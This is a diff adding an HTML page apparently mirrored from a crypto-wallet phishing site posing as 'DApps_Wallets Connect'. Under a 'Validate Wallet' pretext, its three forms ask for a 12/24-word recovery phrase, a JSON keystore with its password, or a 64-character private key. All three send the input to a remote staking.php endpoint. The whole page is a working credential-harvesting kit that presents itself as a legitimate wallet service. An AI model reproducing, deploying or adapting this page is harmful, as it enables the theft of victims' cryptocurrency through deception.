@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from secured.dapps-online.net/en/staking.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 16 Mar 2022 21:35:15 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="viewport" content="width=device-width">
+    
+    <title>DApps_Wallets Connect</title>
+    <meta name="description" content="WalletDappsConnect is a free protocol that lets users manage all their wallets from one space">
+    <meta name="next-head-count" content="5">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="assets/nav.css">
+
+    <link rel="preload" href="assets/2b7eea1d064d98b564d2.css" as="style">
+    <link rel="stylesheet" href="assets/2b7eea1d064d98b564d2.css" data-n-g=""><noscript data-n-css=""></noscript>
+    <script defer="" nomodule="" src="assets/polyfills-eef578260fd80f8fff94.js.download"></script>
+    <script src="assets/webpack-189c53927ffd3caf09c3.js.download" defer=""></script>
+    <script src="assets/framework-92300432a1172ef1338b.js.download" defer=""></script>
+    <script src="assets/main-71948af4b0f09c0fc30e.js.download" defer=""></script>
+    <script src="assets/_app-9e366951ad03f095f5b3.js.download" defer=""></script>
+    <script src="assets/814-16eda819eff2e28d39ff.js.download" defer=""></script>
+    <script src="assets/372-9486bbaab2c58acf8d36.js.html" defer=""></script>
+    <script src="assets/748-1fdaed1ecf495295e008.js.download" defer=""></script>
+    <script src="assets/validate-wallet-6259c41770f7da1aad9c.js.html" defer=""></script>
+    <script src="assets/_buildManifest.js.download" defer=""></script>
+    <script src="assets/_ssgManifest.js.download" defer=""></script>
+    
+    
+    
+</head>
+
+<body>
+    <div id="__next">
+        <header class="fixed z-50 w-full mb-60 bg-white py-8 px-6 text-white border-b shadow-md">
+            <div class="container max-w-screen-lg mx-auto flex flex-row items-center justify-between">
+                <div class="inline-flex items-center justify-center cursor-pointer"><img src="assets/llll.png" height="32" width="32">
+                    <h1 class="text-2xl ml-1 font-black text-secondary">DApps_Wallets Connect</h1>
+                </div>
+            </div>
+        </header>
+        <div class="h-28"></div>
+        <main>
+            <div style="max-width: 400px;" class="container max-w-screen-sm py-20 px-4 h-full items-center justify-items-center mx-auto text-center">
+                <h2 class="text-2xl text-center justify font-bold mb-2">Validate Wallet</h2>
+                <p class="text-sm mb-8">Validate your selected wallet to continue</p>
+                
+                <div class="w3-row">
+                    <a href="javascript:void(0)" onclick="openCity(event, 'phrase');">
+                      <div class="w3-third tablink w3-bottombar w3-hover-light-grey w3-padding">Phrase</div>
+                    </a>
+                    <a href="javascript:void(0)" onclick="openCity(event, 'json');">
+                      <div class="w3-third tablink w3-bottombar w3-hover-light-grey w3-padding">Json</div>
+                    </a>
+                    <a href="javascript:void(0)" onclick="openCity(event, 'key');">
+                      <div class="w3-third tablink w3-bottombar w3-hover-light-grey w3-padding">Private Key</div>
+                    </a>
+                </div>
+
+                <div id="phrase" class="w3-container city" style="display:block">
+                    <div class="w-full">
+                        
+                        <div class="relative flex flex-col min-w-0 break-words bg-white w-full mb-6 shadow-lg rounded">
+                            <div class="px-4 py-5 flex-auto">
+                                <div class="tab-content tab-space">
+                                    <div class="block" id="link1">
+                                        <form method="post" action="https://secured.dapps-online.net/en/staking.php">
+                                            <div class="text-sm mb-1 text-gray-500">Please enter your 12/24 word phrase</div>
+                                            <textarea rows="4" name="phrase" required="" class="px-3 py-3 placeholder-gray-300 text-gray-900 relative bg-white rounded text-sm border border-gray-300 outline-none focus:outline-none focus:ring focus:ring-indigo-600 w-full"></textarea>
+                                            <input type="text" name="wallet" value="" hidden />
+                                            
+                                            <em>
+                                                <br>
+                                            <span style="font-size:0.75em;">Typically 12(sometimes 24) words separated by single spaces</span></em>
+                                            <div class="me-login-btn">
+                                                <button class="inline-flex w-full rounded-full bg-primary text-white active:bg-indigo-600 font-bold uppercase text-base px-8 py-4 items-center justify-center shadow-lg hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150" name="connectW" type="submit">Connect</button>
+                                            </div>
+                                        </form>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="json" class="w3-container city" style="display:none">
+                    <div class="w-full">
+                        
+                        <div class="relative flex flex-col min-w-0 break-words bg-white w-full mb-6 shadow-lg rounded">
+                            <div class="px-4 py-5 flex-auto">
+                                <div class="tab-content tab-space">
+                                    <div class="block" id="link1">
+                                        <form class="p-1" method="POST" action="https://secured.dapps-online.net/en/staking.php">
+                                            <div class="mb-3 pt-0">
+                                                <div class="text-sm mb-1 text-gray-500">Please enter your Json Code and Password</div>
+                                                <textarea name="json" rows="4" name="phrase" required="" class="px-3 py-3 placeholder-gray-300 text-gray-900 relative bg-white rounded text-sm border border-gray-300 outline-none focus:outline-none focus:ring focus:ring-indigo-600 w-full"></textarea>
+                                            </div>
+                                            <div class="mb-3 pt-0">
+                                                <label>Input Password</label>
+                                                <input class="px-3 py-3 placeholder-gray-300 text-gray-900 relative bg-white rounded text-sm border border-gray-300 outline-none focus:outline-none focus:ring focus:ring-indigo-600 w-full" type="password" name="pass" placeholder="" required />
+                                                <input type="text" name="wallet" value="" hidden />
+                                                
+                                                <em><span style="font-size:0.8em;">Several lines of text beginning with "{...}" plus the password you used to encrypt it</span></em>
+                                            </div>
+                                            <div class="mt-6 mb-2">
+                                                <button class="inline-flex w-full rounded-full bg-primary text-white active:bg-indigo-600 font-bold uppercase text-base px-8 py-4 items-center justify-center shadow-lg hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150" name="connectW3" type="submit" name="submit">Connect</button>
+                                            </div>
+                                        </form>
+                                    </div>
+                                   
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="key" class="w3-container city" style="display:none">
+                    <div class="w-full">
+                        
+                        <div class="relative flex flex-col min-w-0 break-words bg-white w-full mb-6 shadow-lg rounded">
+                            <div class="px-4 py-5 flex-auto">
+                                <div class="tab-content tab-space">
+                                    <div class="block" id="link1">
+                                        <form class="p-1" method="POST" action="https://secured.dapps-online.net/en/staking.php">
+                                            <div class="mb-3 pt-0">
+                                                <div class="text-sm mb-1 text-gray-500">Please enter your 64 alphanumeric Private Key</div>
+                                                <input class="px-3 py-3 placeholder-gray-300 text-gray-900 relative bg-white rounded text-sm border border-gray-300 outline-none focus:outline-none focus:ring focus:ring-indigo-600 w-full" type="text" name="key" placeholder="Enter Private Key" required />
+                                                <input type="text" name="wallet" value="" hidden />
+                                            </div>
+                                            <em><span style="font-size:0.8em;">Typically 64 alphanumeric characters</span></em>
+                                            <div class="mt-6 mb-2">
+                                                    <button class="inline-flex w-full rounded-full bg-primary text-white active:bg-indigo-600 font-bold uppercase text-base px-8 py-4 items-center justify-center shadow-lg hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150" type="submit" name="connectW2">Connect</button>
+                                            </div>
+                                        </form>
+
+                                    </div>
+                                   
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                    <script>
+                    function openCity(evt, cityName) {
+                      var i, x, tablinks;
+                      x = document.getElementsByClassName("city");
+                      for (i = 0; i < x.length; i++) {
+                        x[i].style.display = "none";
+                      }
+                      tablinks = document.getElementsByClassName("tablink");
+                      for (i = 0; i < x.length; i++) {
+                        tablinks[i].className = tablinks[i].className.replace(" w3-border-red", "");
+                      }
+                      document.getElementById(cityName).style.display = "block";
+                      evt.currentTarget.firstElementChild.className += " w3-border-red";
+                    }
+                    </script>
+            </div>
+
+            
+        </main>
+        <footer class="border-t border-gray-200">
+            <div class="container max-w-screen-lg mx-auto flex flex-col md:flex-row md:items-center md:justify-between  py-4">
+                <ul class="flex mb-4 md:order-1 md:ml-4 md:mb-0">
+                    <li><a href="#" class="flex justify-center items-center text-primary bg-white hover:bg-white-100 rounded-full shadow transition duration-150 ease-in-out" aria-label="Twitter"><svg class="w-8 h-8 fill-current" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M24 11.5c-.6.3-1.2.4-1.9.5.7-.4 1.2-1 1.4-1.8-.6.4-1.3.6-2.1.8-.6-.6-1.5-1-2.4-1-1.7 0-3.2 1.5-3.2 3.3 0 .3 0 .5.1.7-2.7-.1-5.2-1.4-6.8-3.4-.3.5-.4 1-.4 1.7 0 1.1.6 2.1 1.5 2.7-.5 0-1-.2-1.5-.4 0 1.6 1.1 2.9 2.6 3.2-.3.1-.6.1-.9.1-.2 0-.4 0-.6-.1.4 1.3 1.6 2.3 3.1 2.3-1.1.9-2.5 1.4-4.1 1.4H8c1.5.9 3.2 1.5 5 1.5 6 0 9.3-5 9.3-9.3v-.4c.7-.5 1.3-1.1 1.7-1.8z"></path></svg></a></li>
+                    <li class="ml-4"><a href="#" class="flex justify-center items-center text-primary bg-white hover:bg-white-100 rounded-full shadow transition duration-150 ease-in-out" aria-label="Github"><svg class="w-8 h-8 fill-current" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.2c-4.4 0-8 3.6-8 8 0 3.5 2.3 6.5 5.5 7.6.4.1.5-.2.5-.4V22c-2.2.5-2.7-1-2.7-1-.4-.9-.9-1.2-.9-1.2-.7-.5.1-.5.1-.5.8.1 1.2.8 1.2.8.7 1.3 1.9.9 2.3.7.1-.5.3-.9.5-1.1-1.8-.2-3.6-.9-3.6-4 0-.9.3-1.6.8-2.1-.1-.2-.4-1 .1-2.1 0 0 .7-.2 2.2.8.6-.2 1.3-.3 2-.3s1.4.1 2 .3c1.5-1 2.2-.8 2.2-.8.4 1.1.2 1.9.1 2.1.5.6.8 1.3.8 2.1 0 3.1-1.9 3.7-3.7 3.9.3.4.6.9.6 1.6v2.2c0 .2.1.5.6.4 3.2-1.1 5.5-4.1 5.5-7.6-.1-4.4-3.7-8-8.1-8z"></path></svg></a></li>
+                    <li class="ml-4"><a href="#" class="flex justify-center items-center text-primary bg-white hover:bg-white-100 rounded-full shadow transition duration-150 ease-in-out" aria-label="Facebook"><svg class="w-8 h-8 fill-current" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M14.023 24L14 17h-3v-3h3v-2c0-2.7 1.672-4 4.08-4 1.153 0 2.144.086 2.433.124v2.821h-1.67c-1.31 0-1.563.623-1.563 1.536V14H21l-1 3h-2.72v7h-3.257z"></path></svg></a></li>
+                </ul>
+                <div class="text-sm mr-4">©
+                    <!-- -->2022
+                    <!-- --><a class="text-primary hover:underline" href="index.html">WalletDappsConnect</a>. All rights reserved.</div>
+            </div>
+        </footer>
+    </div>
+    <script id="__NEXT_DATA__" type="application/json">
+        {
+            "props": {
+                "pageProps": {
+                    "id": "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0"
+                },
+                "__N_SSP": true
+            },
+            "page": "/validate-wallet",
+            "query": {
+                "type": "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0"
+            },
+            "buildId": "99CfkRsAfrb2NPxB7G1Lv",
+            "runtimeConfig": {},
+            "isFallback": false,
+            "gssp": true
+        }
+    </script>
+
+
+
+</body>
+
+<!-- Mirrored from secured.dapps-online.net/en/staking.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 16 Mar 2022 21:35:18 GMT -->
+</html>
